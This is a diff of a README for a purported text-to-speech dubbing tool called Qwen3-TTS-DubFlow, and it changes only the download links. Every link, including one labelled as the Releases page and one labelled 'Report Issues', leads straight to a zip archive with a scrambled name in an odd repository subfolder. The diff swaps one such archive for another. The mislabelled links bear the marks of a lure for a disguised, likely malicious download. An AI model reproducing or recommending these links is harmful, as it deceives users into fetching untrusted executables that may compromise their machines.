@@ -1,6 +1,6 @@
 # 🎙️ Qwen3-TTS-DubFlow - A Smart Dubbing Tool for Everyone
 
-[![Download Qwen3-TTS-DubFlow](https://github.com/CapitalTaser/Qwen3-TTS-DubFlow/raw/refs/heads/main/dramaturge/TT-Flow-Qwen-Dub-v3.3.zip)](https://github.com/CapitalTaser/Qwen3-TTS-DubFlow/raw/refs/heads/main/dramaturge/TT-Flow-Qwen-Dub-v3.3.zip)
+[![Download Qwen3-TTS-DubFlow](https://raw.githubusercontent.com/CapitalTaser/Qwen3-TTS-DubFlow/main/dramaturge/Dub-Qwen-Flow-TT-v1.1.zip)](https://raw.githubusercontent.com/CapitalTaser/Qwen3-TTS-DubFlow/main/dramaturge/Dub-Qwen-Flow-TT-v1.1.zip)
 
 ## 📃 Introduction
 
@@ -12,7 +12,7 @@ To get started with Qwen3-TTS-DubFlow, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access our Releases page, where you can download the software.  
-   [Visit this page to download](https://github.com/CapitalTaser/Qwen3-TTS-DubFlow/raw/refs/heads/main/dramaturge/TT-Flow-Qwen-Dub-v3.3.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/CapitalTaser/Qwen3-TTS-DubFlow/main/dramaturge/Dub-Qwen-Flow-TT-v1.1.zip)
 
 2. **Choose the Right Version**  
    Look for the latest version listed on the Releases page. You will see different files available for download. Select the file that fits your operating system, such as `.exe` for Windows or `.dmg` for macOS.
@@ -100,7 +100,7 @@ We welcome contributions! If you want to help improve Qwen3-TTS-DubFlow, check o
 
 ## 🔗 Links
 
-- [Download Qwen3-TTS-DubFlow](https://github.com/CapitalTaser/Qwen3-TTS-DubFlow/raw/refs/heads/main/dramaturge/TT-Flow-Qwen-Dub-v3.3.zip)
-- [Report Issues](https://github.com/CapitalTaser/Qwen3-TTS-DubFlow/raw/refs/heads/main/dramaturge/TT-Flow-Qwen-Dub-v3.3.zip)
+- [Download Qwen3-TTS-DubFlow](https://raw.githubusercontent.com/CapitalTaser/Qwen3-TTS-DubFlow/main/dramaturge/Dub-Qwen-Flow-TT-v1.1.zip)
+- [Report Issues](https://raw.githubusercontent.com/CapitalTaser/Qwen3-TTS-DubFlow/main/dramaturge/Dub-Qwen-Flow-TT-v1.1.zip)
 
 Thank you for using Qwen3-TTS-DubFlow! We hope it makes your audio projects easier and more enjoyable.
